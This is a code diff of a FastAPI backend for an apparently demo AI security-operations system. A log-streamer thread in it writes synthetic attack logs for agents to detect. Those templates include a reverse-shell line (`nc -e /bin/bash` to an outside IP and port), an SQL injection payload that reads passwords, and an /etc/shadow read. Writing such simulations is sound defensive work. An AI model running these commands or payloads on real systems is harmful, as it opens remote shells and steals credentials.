@@ -17,11 +17,6 @@ Endpoints
     GET    /api/health              NIM API health check
     GET    /api/notifications       Human-escalation notifications
     WebSocket /ws/events            Real-time event stream (JSON)
-
-Run
----
-    uvicorn backend.api_server:app --host 0.0.0.0 --port 8000 --reload
-    (from the soc-in-a-box project root)
 ----------------------------------------------------------------------------
 """
 
@@ -49,10 +44,10 @@ from dotenv import load_dotenv
 
 load_dotenv(dotenv_path=_ROOT / ".env")
 
-# -- Local modules (relative imports work because we add _ROOT to sys.path) ---
-from backend.audit_db       import log_event, get_events, get_event_count, get_stats
+# -- Local modules --
+from backend.audit_db       import log_event, get_events, get_event_count, get_stats, clear_all_events
 from backend.event_bus      import publish, subscribe, unsubscribe, make_event
-from backend.email_notifier import send_alert, is_configured
+from backend.email_notifier import send_alert, is_configured, reset_anti_spam
 
 from nvidia_nim_client import NvidiaNimClient
 from sentry            import SentryAgent
@@ -60,73 +55,83 @@ from investigator      import InvestigatorAgent
 from responder         import ResponderAgent
 
 # ---------------------------------------------------------------------------
-# Logging
+# Logging (Routed exclusively to soc.log and WebSockets for the Frontend GUI)
 # ---------------------------------------------------------------------------
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s  %(levelname)-8s  %(message)s",
     datefmt="%H:%M:%S",
     handlers=[
-        logging.StreamHandler(sys.stdout),
-        logging.FileHandler(str(_ROOT / "soc.log"), mode="a"),
+        logging.FileHandler(str(_ROOT / "soc.log"), mode="a", encoding="utf-8"),
     ],
 )
 logger = logging.getLogger(__name__)
 
+
 class _LogStreamer(threading.Thread):
-    """Streams authentic realistic logs line-by-line into the watched log file with a delay."""
-    def __init__(self, log_file: Path, interval: float = 3.0):
+    """Streams authentic, realistic logs at a natural human-like cadence into the watched directory."""
+    def __init__(self, log_file: Path, base_interval: float = 7.0):
         super().__init__(daemon=True, name="LogStreamer")
         self.log_file = log_file
-        self.interval = interval
+        self.base_interval = base_interval
         self.running = True
 
     def run(self):
         self.log_file.parent.mkdir(parents=True, exist_ok=True)
         tick = 0
+        last_critical_time = time.time() - 120.0  # First critical arrives ~60s after start, then every 3 min
 
         normal_templates = [
-            "{ts} INFO  [web-server] {ip} - - \"GET /api/v1/users HTTP/1.1\" 200 45ms",
-            "{ts} INFO  [web-server] {ip} - - \"POST /api/v1/login HTTP/1.1\" 200 120ms",
-            "{ts} INFO  [db-cluster] Query OK SELECT * FROM users WHERE status='active' [12ms]",
-            "{ts} INFO  [sshd[{pid}]] Accepted password for {user} from {ip} port {port} ssh2",
-            "{ts} INFO  [systemd] Started Daily apt upgrade and clean activities.",
-            "{ts} INFO  [cron[{pid}]] ({user}) CMD (/usr/bin/backup.sh)",
+            "{ts} INFO  [nginx/1.24.0] {ip} - - [{date_str}] \"GET /api/v1/health HTTP/1.1\" 200 45 \"https://app.company.internal/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+            "{ts} INFO  [nginx/1.24.0] {ip} - - [{date_str}] \"GET /static/bundle.js HTTP/1.1\" 200 84210 \"https://app.company.internal/dashboard\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"",
+            "{ts} INFO  [auth-svc] [UserAuth] User {user} successfully authenticated via OAuth2 (session_id={sess})",
+            "{ts} INFO  [postgres] [LOG] connection authorized: user={user} database=production application_name=worker-{pid}",
+            "{ts} INFO  [postgres] [LOG] duration: 4.218 ms  statement: SELECT id, username, email FROM users WHERE org_id = 104 AND status = 'active';",
+            "{ts} INFO  [sshd[{pid}]] Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{sess}",
+            "{ts} INFO  [systemd] Started Periodic Background Maintenance Task #{pid}.",
+            "{ts} INFO  [cron[{pid}]] ({user}) CMD (/opt/scripts/sync_telemetry.sh > /dev/null 2>&1)",
         ]
 
         low_med_templates = [
             "{ts} WARNING [sshd[{pid}]] Failed password for invalid user admin from 185.220.101.34 port {port} ssh2",
-            "{ts} WARNING [web-server] Slow response {ip} \"GET /api/v1/reports HTTP/1.1\" 200 3500ms - possible DoS",
-            "{ts} ERROR   [db-cluster] Query failed: Syntax error near 'UNION SELECT * FROM audit_log' at line 1",
+            "{ts} WARNING [nginx/1.24.0] Slow upstream response {ip} \"GET /api/v1/analytics/export HTTP/1.1\" 200 4120ms",
+            "{ts} WARNING [db-pool] Connection pool utilization above 82% (active: 41/50 connections)",
+            "{ts} ERROR   [postgres] [ERROR] syntax error at or near \"UNION\" at character 42: \"SELECT * FROM orders WHERE id=1 UNION SELECT null, username, password FROM users;\"",
         ]
 
         high_risk_templates = [
-            "{ts} ERROR   [sudo] dave : FAILED ; TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/bin/bash\n{ts} CRITICAL [pam_unix] authentication failure; logname=dave uid=1001 euid=0 tty=pts/0 rhost=185.220.101.34 user=root",
-            "{ts} CRITICAL [auditd] SYSCALL type=OPEN comm=cat name=/etc/shadow user=dave src=185.220.101.34 - UNAUTHORIZED ACCESS",
-            "{ts} CRITICAL [process] Suspicious command detected: `nc -e /bin/bash 185.220.101.34 4444` by user root from 185.220.101.34",
-            "{ts} CRITICAL [network] Unusual outbound transfer: 524MB to 185.220.101.34:443 from internal DB server - potential DATA EXFILTRATION",
+            "{ts} ERROR   [sudo] dave : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/bin/bash\n{ts} CRITICAL [pam_unix] authentication failure; logname=dave uid=1001 euid=0 tty=pts/0 rhost=185.220.101.34 user=root",
+            "{ts} CRITICAL [auditd] SYSCALL arch=c000003e syscall=2 success=no exit=-13 a0=7ffd6 name=/etc/shadow comm=cat exe=/usr/bin/cat key=unauthorized_shadow_read",
+            "{ts} CRITICAL [process_monitor] Suspicious execution detected: `nc -e /bin/bash 185.220.101.34 4444` spawned by parent pid={pid}",
+            "{ts} CRITICAL [network_sensor] Anomalous data volume: 480MB outbound transfer to 185.220.101.34:443 from internal database host",
         ]
 
-        users = ["alice", "bob", "charlie", "dave"]
-        ips   = ["192.168.1.10", "192.168.1.25", "10.0.0.5"]
+        users = ["alice", "bob", "charlie", "dave", "sarah"]
+        ips   = ["192.168.1.15", "192.168.1.42", "10.0.4.12", "172.16.2.8"]
 
-        logger.info(f"[LogStreamer] Started streaming logs to '{self.log_file}' every {self.interval}s")
+        logger.info(f"[LogStreamer] Initialized natural log stream to '{self.log_file}' (Critical events every 3 min)")
 
         while self.running:
             tick += 1
-            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            pid = random.randint(2000, 9999)
-            port = random.randint(40000, 65000)
+            now_dt = datetime.now()
+            now_ts = time.time()
+            ts = now_dt.strftime("%Y-%m-%d %H:%M:%S")
+            date_str = now_dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
+            pid = random.randint(2100, 9800)
+            port = random.randint(41000, 64000)
+            sess = f"{random.randint(100000, 999999):x}"
             user = random.choice(users)
             ip = random.choice(ips)
 
-            # Alternate normal logs, low/med risk (auto-fixed by AI), and high risk (user fix required)
-            if tick % 5 == 0:
-                text = random.choice(high_risk_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)
-            elif tick % 3 == 0:
-                text = random.choice(low_med_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)
+            # Trigger a critical event once every ~3 minutes (180 seconds)
+            if (now_ts - last_critical_time >= 180.0) and tick > 6:
+                text = random.choice(high_risk_templates).format(ts=ts, date_str=date_str, pid=pid, port=port, sess=sess, user=user, ip=ip)
+                last_critical_time = now_ts
+                logger.info(f"[LogStreamer] Dispatched scheduled 3-minute critical security event")
+            elif random.random() < 0.12:
+                text = random.choice(low_med_templates).format(ts=ts, date_str=date_str, pid=pid, port=port, sess=sess, user=user, ip=ip)
             else:
-                text = random.choice(normal_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)
+                text = random.choice(normal_templates).format(ts=ts, date_str=date_str, pid=pid, port=port, sess=sess, user=user, ip=ip)
 
             try:
                 with open(self.log_file, "a", encoding="utf-8") as fh:
@@ -136,14 +141,16 @@ class _LogStreamer(threading.Thread):
             except Exception as e:
                 logger.error(f"[LogStreamer] Write error: {e}")
 
-            time.sleep(self.interval)
+            delay = random.uniform(self.base_interval * 0.8, self.base_interval * 1.3)
+            time.sleep(delay)
+
 
 # ---------------------------------------------------------------------------
 # FastAPI App
 # ---------------------------------------------------------------------------
 app = FastAPI(
     title="SOC-in-a-Box API",
-    description="Multi-Agent Autonomous Security Researcher",
+    description="Multi-Agent Autonomous Security Operations Center",
     version="2.0.0",
 )
 
@@ -178,7 +185,6 @@ class _EngineState:
         self.alert_queue  = queue.Queue()
         self.report_queue = queue.Queue()
 
-        # Agent-level status
         self.agent_status = {
             "sentry":       {"status": "idle", "last_action": None, "alerts_sent": 0},
             "investigator": {"status": "idle", "last_action": None, "reports_sent": 0},
@@ -189,20 +195,6 @@ _engine = _EngineState()
 
 
 # ---------------------------------------------------------------------------
-# Patched agents with event-bus hooks
-# ---------------------------------------------------------------------------
-
-def _patched_sentry_analyze(original_method, engine: _EngineState):
-    """Wrap SentryAgent._analyze_change to emit events."""
-    def wrapper(self, trigger, file_path):
-        engine.agent_status["sentry"]["status"] = "analyzing"
-        engine.agent_status["sentry"]["last_action"] = datetime.now().isoformat()
-        original_method(self, trigger, file_path)
-        engine.agent_status["sentry"]["status"] = "watching"
-    return wrapper
-
-
-# ---------------------------------------------------------------------------
 # REST endpoints
 # ---------------------------------------------------------------------------
 
@@ -210,7 +202,7 @@ def _patched_sentry_analyze(original_method, engine: _EngineState):
 async def start_engine(body: dict):
     """
     Start the SOC pipeline.
-    Body: { watch_path, api_key, model, reports_dir, simulate }
+    Body: { watch_path, api_key, model, reports_dir, simulate, cooldown }
     """
     global _engine
 
@@ -232,7 +224,7 @@ async def start_engine(body: dict):
     _engine.model        = model
     _engine.simulate     = simulate
 
-    # NIM client
+    # NIM client with automatic fallback support
     _engine.nim = NvidiaNimClient(base_url=nim_url, model=model, api_key=api_key)
 
     # Agents
@@ -268,14 +260,14 @@ async def start_engine(body: dict):
     _engine._t_res.start()
     _engine.sentry.start()
 
-    # Monkey-patch the responder to also call email + event bus AFTER sentry starts
+    # Install telemetry hooks and email routing
     _install_responder_hooks(_engine.responder)
     _install_sentry_hooks(_engine.sentry)
     _install_investigator_hooks(_engine.investigator)
 
-    # Start realistic log streamer (sends real-looking logs line-by-line with delay)
+    # Start realistic log streamer with natural pacing
     app_log_path = Path(watch_path) / "app.log"
-    _engine._t_log = _LogStreamer(app_log_path)
+    _engine._t_log = _LogStreamer(app_log_path, base_interval=7.0)
     _engine._t_log.start()
 
     _engine.running    = True
@@ -330,26 +322,98 @@ async def stop_engine():
     return {"status": "stopped"}
 
 
-@app.post("/api/incidents/{incident_id}/fix")
-@app.post("/api/notifications/{incident_id}/fix")
-async def apply_incident_fix(incident_id: str):
+@app.post("/api/reset")
+async def reset_all_data():
     """
-    Execute user-approved fix for a high-risk incident/notification.
+    Clears all logs, incident markdown reports, notifications, SQLite audit history,
+    and agent telemetry so the system starts completely fresh.
     """
-    log_event("USER", "FIX_APPLIED", "INFO", f"User manually applied recommended fix for incident {incident_id}")
-    publish(make_event("RESPONSE", "USER", {
-        "incident_id": incident_id,
-        "action_taken": "MANUAL_USER_FIX",
-        "message": f"✓ Fix applied successfully by user for {incident_id}.",
-        "severity": "INFO",
-        "escalated": False,
+    global _engine
+    import shutil
+
+    # 1. Stop engine if running
+    if _engine.running:
+        if _engine._t_log:
+            _engine._t_log.running = False
+            _engine._t_log = None
+        if _engine.sentry:
+            _engine.sentry.stop()
+        if _engine.investigator:
+            _engine.investigator.stop()
+        if _engine.responder:
+            _engine.responder.stop()
+        _engine.running = False
+        _engine.start_time = None
+
+    # 2. Reset in-memory queues and agent state
+    _engine.alert_queue = queue.Queue()
+    _engine.report_queue = queue.Queue()
+    for ag in _engine.agent_status.values():
+        ag["status"] = "idle"
+        ag["last_action"] = None
+        if "alerts_sent" in ag: ag["alerts_sent"] = 0
+        if "reports_sent" in ag: ag["reports_sent"] = 0
+        if "incidents" in ag: ag["incidents"] = 0
+
+    # 3. Truncate SQLite audit DB
+    clear_all_events()
+
+    # 4. Reset anti-spam cache
+    reset_anti_spam()
+
+    # 5. Clear all files in reports directory
+    reports_dir = _ROOT / "reports"
+    if reports_dir.exists():
+        for item in reports_dir.iterdir():
+            try:
+                if item.is_file():
+                    item.unlink()
+                elif item.is_dir():
+                    shutil.rmtree(item)
+            except Exception as e:
+                logger.warning(f"[Reset] Could not delete report item {item}: {e}")
+
+    # 6. Clear quarantine directory
+    quarantine_dir = _ROOT / "quarantine"
+    if quarantine_dir.exists():
+        for item in quarantine_dir.iterdir():
+            try:
+                if item.is_file():
+                    item.unlink()
+                elif item.is_dir():
+                    shutil.rmtree(item)
+            except Exception as e:
+                logger.warning(f"[Reset] Could not delete quarantine item {item}: {e}")
+
+    # 7. Truncate soc.log
+    soc_log = _ROOT / "soc.log"
+    try:
+        with open(soc_log, "w", encoding="utf-8") as fh:
+            fh.write("")
+    except Exception as e:
+        logger.warning(f"[Reset] Could not truncate soc.log: {e}")
+
+    # 8. Truncate monitored application logs
+    for log_dir in [_ROOT / "logs", _ROOT / "victim_app" / "logs"]:
+        if log_dir.exists():
+            for item in log_dir.glob("*.log"):
+                try:
+                    with open(item, "w", encoding="utf-8") as fh:
+                        fh.write("")
+                except Exception as e:
+                    logger.warning(f"[Reset] Could not truncate {item}: {e}")
+
+    # 9. Record fresh initialization event and broadcast reset
+    log_event("SYSTEM", "RESET", "INFO", "System environment and incident logs reset to fresh clean state.")
+    publish(make_event("STATUS", "SYSTEM", {
+        "message": "System environment reset to clean fresh state.",
+        "action": "RESET",
     }))
+
     return {
         "status": "success",
-        "incident_id": incident_id,
-        "message": f"Fix applied successfully by user for {incident_id}."
+        "message": "All logs, reports, notifications, and audit history successfully cleared."
     }
-
 
 
 @app.get("/api/status")
@@ -385,13 +449,11 @@ async def get_logs(
     except Exception as exc:
         raise HTTPException(500, f"Cannot read log: {exc}")
 
-    # Parse lines into structured dicts
     for raw in reversed(lines):
         line = raw.strip()
         if not line:
             continue
 
-        # Detect level
         lvl = "INFO"
         if "CRITICAL" in line:  lvl = "CRITICAL"
         elif "ERROR"   in line: lvl = "ERROR"
@@ -471,28 +533,28 @@ async def get_audit_stats():
 async def get_health():
     nim_ok = False
     nim_latency_ms = None
+    api_key = (_engine.nim.api_key if _engine.nim else None) or os.getenv("NVIDIA_API_KEY") or os.getenv("NVIDIA_NIM_KEY", "")
+    has_key = bool(api_key and str(api_key).strip())
 
-    if _engine.nim:
+    if _engine.nim and has_key:
         t0 = time.time()
         nim_ok = _engine.nim.is_available()
         nim_latency_ms = round((time.time() - t0) * 1000)
-    else:
-        # Try with env vars
-        api_key = os.getenv("NVIDIA_API_KEY", "")
-        if api_key:
-            nim = NvidiaNimClient(api_key=api_key)
-            t0 = time.time()
-            nim_ok = nim.is_available()
-            nim_latency_ms = round((time.time() - t0) * 1000)
+    elif has_key:
+        nim = NvidiaNimClient(api_key=api_key)
+        t0 = time.time()
+        nim_ok = nim.is_available()
+        nim_latency_ms = round((time.time() - t0) * 1000)
 
     return {
-        "nim_reachable":  nim_ok,
-        "nim_latency_ms": nim_latency_ms,
-        "model":          _engine.model or os.getenv("NVIDIA_MODEL", "meta/llama-3.1-8b-instruct"),
+        "nim_reachable":    nim_ok,
+        "nim_latency_ms":   nim_latency_ms,
+        "has_api_key":      has_key,
+        "model":            _engine.model or os.getenv("NVIDIA_NIM_MODEL", "meta/llama-3.3-70b-instruct"),
         "email_configured": is_configured(),
-        "engine_running": _engine.running,
-        "uptime_s":       int(time.time() - _engine.start_time) if _engine.start_time else 0,
-        "timestamp":      datetime.now().isoformat(),
+        "engine_running":   _engine.running,
+        "uptime_s":         int(time.time() - _engine.start_time) if _engine.start_time else 0,
+        "timestamp":        datetime.now().isoformat(),
     }
 
 
@@ -535,7 +597,6 @@ async def websocket_events(ws: WebSocket):
 
     try:
         while True:
-            # Drain the sync queue into the async WebSocket
             try:
                 while True:
                     event = q.get_nowait()
@@ -543,7 +604,6 @@ async def websocket_events(ws: WebSocket):
             except queue.Empty:
                 pass
 
-            # Check if client sent anything (ping/pong keepalive)
             await asyncio.sleep(0.1)
 
     except WebSocketDisconnect:
@@ -555,16 +615,14 @@ async def websocket_events(ws: WebSocket):
 
 
 # ---------------------------------------------------------------------------
-# Agent hooks — inject event-bus + audit calls into agents at runtime
+# Agent hooks
 # ---------------------------------------------------------------------------
 
 def _install_sentry_hooks(sentry: SentryAgent):
-    """Patch the Sentry's internal handler to publish events."""
     handler = None
     if hasattr(sentry, '_observer') and sentry._observer and getattr(sentry._observer, '_event_handlers', None):
         handler = sentry._observer._event_handlers[0]
 
-    # We wrap the alert_queue.put to intercept alerts going out
     original_put = _engine.alert_queue.put
 
     def patched_put(alert):
@@ -591,13 +649,11 @@ def _install_sentry_hooks(sentry: SentryAgent):
 
     _engine.alert_queue.put = patched_put
 
-    # Also log ALL analysis events (including clean ones) to the audit DB
     if handler and hasattr(handler, '_analyze_change'):
         original_analyze = handler._analyze_change
 
         def patched_analyze(trigger, file_path):
             original_analyze(trigger, file_path)
-            # Log the file analysis event regardless of outcome
             log_event(
                 agent      = "SENTRY",
                 event_type = "ANALYSIS",
@@ -611,7 +667,6 @@ def _install_sentry_hooks(sentry: SentryAgent):
 
 
 def _install_investigator_hooks(investigator: InvestigatorAgent):
-    """Wrap InvestigatorAgent.investigate to emit events."""
     original_investigate = investigator.investigate
 
     def patched_investigate(alert):
@@ -619,7 +674,7 @@ def _install_investigator_hooks(investigator: InvestigatorAgent):
         _engine.agent_status["investigator"]["last_action"] = datetime.now().isoformat()
 
         publish(make_event("INVESTIGATION", "INVESTIGATOR", {
-            "message": f"Starting investigation for alert {alert.get('alert_id')}",
+            "message": f"Starting forensic triage for alert {alert.get('alert_id')}",
             "alert_id": alert.get("alert_id"),
         }))
 
@@ -653,7 +708,6 @@ def _install_investigator_hooks(investigator: InvestigatorAgent):
 
 
 def _install_responder_hooks(responder: ResponderAgent):
-    """Wrap ResponderAgent.classify_and_respond and notify_human."""
     original_respond  = responder.classify_and_respond
     original_notify   = responder.notify_human
 
@@ -666,6 +720,32 @@ def _install_responder_hooks(responder: ResponderAgent):
         _engine.agent_status["responder"]["status"] = "running"
         _engine.agent_status["responder"]["incidents"] = \
             _engine.agent_status["responder"].get("incidents", 0) + 1
+
+        sev = str(summary.get("severity", "")).upper()
+        ai = summary.get("ai_analysis", {})
+
+        # Automatically email critical incidents (with anti-spam deduplication)
+        if sev == "CRITICAL":
+            desc_reason = (
+                summary.get("escalation_reason")
+                or ai.get("why")
+                or f"Critical threat responded with action: {summary.get('action_taken')}"
+            )
+            extra = (
+                f"Action Taken : {summary.get('action_taken')} (Target: {summary.get('target') or 'System'})\n"
+                f"Attack Vector: {ai.get('how', 'N/A')}\n"
+                f"Root Cause   : {ai.get('why', 'N/A')}\n"
+                f"Impact       : {ai.get('impact', 'N/A')}\n"
+                f"Tactic       : {ai.get('mitre_tactic', 'N/A')}"
+            )
+            send_alert(
+                incident_id   = summary.get("incident_id", ""),
+                severity      = "CRITICAL",
+                event_type    = summary.get("event_type", "SECURITY_BREACH"),
+                reason        = desc_reason,
+                report_path   = summary.get("report_path", ""),
+                extra_details = extra,
+            )
 
         publish(make_event("RESPONSE", "RESPONDER", {
             "incident_id":  summary.get("incident_id"),
@@ -688,28 +768,11 @@ def _install_responder_hooks(responder: ResponderAgent):
     def patched_notify(incident_id, reason, report_path):
         original_notify(incident_id, reason, report_path)
 
-        alert_info = {}
-        try:
-            rp = Path(report_path)
-            if rp.exists():
-                alert_info["report_snippet"] = rp.read_text()[:500]
-        except Exception:
-            pass
-
-        # Real email
-        send_alert(
-            incident_id = incident_id,
-            severity    = "HIGH",
-            event_type  = "ESCALATE_HUMAN",
-            reason      = reason,
-            report_path = report_path,
-        )
-
         publish(make_event("NOTIFICATION", "RESPONDER", {
             "incident_id": incident_id,
             "reason":      reason,
             "report_path": report_path,
-            "message":     "⚠ Human intervention required!",
+            "message":     "Human intervention required!",
         }, severity="HIGH"))
 
         log_event(
